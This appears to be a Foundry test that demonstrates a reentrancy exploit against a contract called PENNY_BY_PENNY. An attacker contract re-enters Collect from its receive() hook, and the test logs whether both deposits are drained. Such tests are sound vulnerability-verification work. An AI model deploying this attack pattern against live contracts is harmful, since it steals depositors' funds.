// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b.sol";

contract MockLogFile {
    function AddMessage(address, uint, string memory) public {
        // Minimal implementation for test
    }
}

contract MaliciousAttacker {
    PENNY_BY_PENNY public pennyContract;
    uint public reentrancyCount;
    uint public attackAmount;

    constructor(PENNY_BY_PENNY _pennyContract) payable {
        pennyContract = _pennyContract;
        attackAmount = msg.value;
    }

    function deposit() public {
        pennyContract.Put{value: attackAmount}(0);
    }

    function initiateAttack() public {
        pennyContract.Collect(attackAmount);
    }

    receive() external payable {
        if (reentrancyCount < 1 && address(pennyContract).balance >= attackAmount) {
            reentrancyCount++;
            pennyContract.Collect(attackAmount);
        }
    }
}

contract ReentrancyTest is Test {
    PENNY_BY_PENNY public penny;
    MockLogFile public mockLog;
    MaliciousAttacker public attacker;
    
    uint public constant ATTACKER_DEPOSIT = 1 ether;
    uint public constant VICTIM_DEPOSIT = 1 ether;

    function setUp() public {
        // Deploy contracts
        penny = new PENNY_BY_PENNY();
        mockLog = new MockLogFile();
        
        // Setup penny contract
        penny.SetLogFile(address(mockLog));
        penny.SetMinSum(0.1 ether);
        
        // Deploy attacker with initial deposit
        attacker = new MaliciousAttacker{value: ATTACKER_DEPOSIT}(penny);
        
        // Deposit attacker's funds into penny contract
        attacker.deposit();
        
        // Victim deposit (simulate other users' funds)
        vm.deal(address(this), VICTIM_DEPOSIT);
        penny.Put{value: VICTIM_DEPOSIT}(0);
        
        // Advance time to satisfy unlock condition
        vm.warp(block.timestamp + 1);
    }

    function testReentrancyVulnerability() public {
        // Record initial balances
        uint totalDeposited = ATTACKER_DEPOSIT + VICTIM_DEPOSIT;
        uint initialContractBalance = address(penny).balance;
        uint initialAttackerBalance = address(attacker).balance;

        console.log("--- BEFORE-Trigger: Reentrancy Attack ---");
        console.log("Penny Contract ETH Balance Before:", initialContractBalance);
        console.log("Attacker Contract ETH Balance Before:", initialAttackerBalance);
        require(
            initialContractBalance == totalDeposited, 
            "Initial contract balance should be 2 ETH"
        );

        console.log("--- TRIGGER: Execute Attack ---");
        attacker.initiateAttack();

        // Record final balances
        uint finalContractBalance = address(penny).balance;
        uint finalAttackerBalance = address(attacker).balance;
        
        console.log("--- AFTER-Trigger: Reentrancy Attack ---");
        console.log("Penny Contract ETH Balance After:", finalContractBalance);
        console.log("Attacker Contract ETH Balance After:", finalAttackerBalance);
        
        // Calculate balance changes
        uint contractLoss = initialContractBalance - finalContractBalance;
        uint attackerGain = finalAttackerBalance - initialAttackerBalance;
        
        console.log("Penny Contract Loss:", contractLoss);
        console.log("Attacker Gain:", attackerGain);

        // Final vulnerability check
        if (finalContractBalance == 0 && attackerGain == totalDeposited) {
            console.log("Vulnerability Exists: Reentrancy attack drained the contract of 2 ETH");
        } else {
            console.log("Vulnerability not Exist: Contract balance was not drained as expected");
        }
    }
}